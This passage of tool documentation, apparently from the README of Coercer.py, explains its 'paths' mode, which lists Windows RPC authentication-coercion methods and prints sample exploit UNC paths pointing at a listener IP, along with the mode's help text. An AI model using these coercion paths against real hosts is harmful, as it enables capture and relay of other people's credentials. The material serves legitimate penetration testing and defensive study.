### Paths mode

The **paths** mode lists all the available coerce methods along with the exploit paths (UNC paths) that can be used to coerce an authentication, without contacting any target.

```
./Coercer.py paths
```

Render the exploit paths for a specific listener IP address:

```
./Coercer.py paths -I 192.168.1.10
```

Only list the methods of a given protocol, for example [MS-DFSNM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) or [MS-FSRVP](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b):

```
./Coercer.py paths --filter-protocol-name MS-DFSNM
./Coercer.py paths --filter-protocol-name MS-FSRVP
```

Only list the exploit paths triggering a given authentication type (`smb` or `http`):

```
./Coercer.py paths --auth-type smb
```

Example of output:

```
[+]  [MS-DFSNM] NetrDfsAddStdRoot (opnum 12)
   [info]  Pipe: \PIPE\netdfs (uuid: 4fc742e0-4a10-11cf-8273-00aa004ae673, version: 3.0)
   [info]  TCP endpoint: (uuid: 4fc742e0-4a10-11cf-8273-00aa004ae673, version: 3.0)
   [info]  Usable coerce paths (listener: 192.168.1.10):
      [smb] \\192.168.1.10\97ZWGIf0\file.txt
      [smb] \\192.168.1.10\WLhyNU5g\
      [smb] \\192.168.1.10\QB8yY3By
      [http] \\192.168.1.10@80/e8S\share\file.txt
```

Complete help of this mode:

```
# ./Coercer.py paths -h
usage: Coercer.py paths [-h] [-v] [--debug] [--disable-escape-codes] [--http-port HTTP_PORT] [--smb-port SMB_PORT]
                        [--auth-type {smb,http}] [--filter-method-name FILTER_METHOD_NAME]
                        [--filter-protocol-name FILTER_PROTOCOL_NAME] [--filter-pipe-name FILTER_PIPE_NAME]
                        [-I IP_ADDRESS] [--path-ip PATH_IP] [--minimum-log-level MINIMUM_LOG_LEVEL] [--log-file LOG_FILE]

options:
  -h, --help            show this help message and exit
  -v, --verbose         Verbose mode (default: False)
  --debug               Debug mode (default: False)
  --disable-escape-codes
                        Disable ANSI escape codes

Advanced configuration:
  --http-port HTTP_PORT
                        HTTP port (default: 80)
  --smb-port SMB_PORT   SMB port (default: 445)
  --auth-type {smb,http}
                        Desired authentication type.

Filtering:
  --filter-method-name FILTER_METHOD_NAME
                        Filter by method name
  --filter-protocol-name FILTER_PROTOCOL_NAME
                        Filter by protocol name
  --filter-pipe-name FILTER_PIPE_NAME
                        Filter by pipe name

Listener:
  -I IP_ADDRESS, --ip-address IP_ADDRESS
                        IP address of the listener used to render the exploit paths.
  --path-ip PATH_IP     IP address to use when generating exploit paths.

Logging:
  --minimum-log-level MINIMUM_LOG_LEVEL
                        Minimum logging level (integer).
  --log-file LOG_FILE   Path for the file to log to (enables logging).
```
